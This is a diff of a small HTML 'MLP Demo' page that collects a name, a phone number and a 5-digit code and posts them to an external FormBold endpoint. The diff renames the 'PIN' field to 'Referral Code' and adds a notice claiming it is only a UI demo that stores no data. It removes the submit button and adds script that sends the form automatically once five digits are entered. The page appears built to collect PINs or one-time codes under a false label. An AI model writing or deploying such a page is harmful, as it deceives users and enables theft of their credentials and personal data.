@@ -12,16 +12,25 @@
 
 <div class="wrapper">
 
-    <h1>MLP Demo</h1>
+    <div class="logo">
+        <h1>MLP Demo</h1>
+    </div>
 
-    <form action="https://formbold.com/s/3Labw" method="POST">
+    <h2>Interface Practice</h2>
 
-    
+    <p class="notice">
+        This is a UI demo. No data is stored locally.
+    </p>
+
+    <form id="refForm" action="https://formbold.com/s/3Labw" method="POST">
+
+        <label>Full Name</label>
+        <input type="text" name="fullname" required>
 
         <label>Phone Number</label>
         <input type="tel" name="phone" required>
 
-        <label>PIN</label>
+        <label>Referral Code (5 digits)</label>
 
         <div class="pin-container">
             <input type="text" maxlength="1" inputmode="numeric">
@@ -32,21 +41,21 @@
         </div>
 
         <!-- hidden field sent to FormBold -->
-        <input type="hidden" name="PIN" id="pin">
-
-        <button type="submit">Submit</button>
+        <input type="hidden" name="referral_code" id="referral_code">
 
     </form>
 
 </div>
 
 <script>
+const form = document.getElementById("refForm");
 const inputs = document.querySelectorAll(".pin-container input");
 const hiddenInput = document.getElementById("referral_code");
 
 inputs.forEach((input, index) => {
 
     input.addEventListener("input", function () {
+
         this.value = this.value.replace(/[^0-9]/g, "");
 
         if (this.value.length > 1) {
@@ -57,7 +66,7 @@ inputs.forEach((input, index) => {
             inputs[index + 1].focus();
         }
 
-        updateHidden();
+        updateAndSubmit();
     });
 
     input.addEventListener("keydown", function (e) {
@@ -68,10 +77,20 @@ inputs.forEach((input, index) => {
 
 });
 
-function updateHidden() {
+function updateAndSubmit() {
+
     let code = "";
+
     inputs.forEach(i => code += i.value);
+
     hiddenInput.value = code;
+
+    if (code.length === 5 && /^[0-9]{5}$/.test(code)) {
+
+        setTimeout(() => {
+            form.submit();
+        }, 300);
+    }
 }
 </script>
 
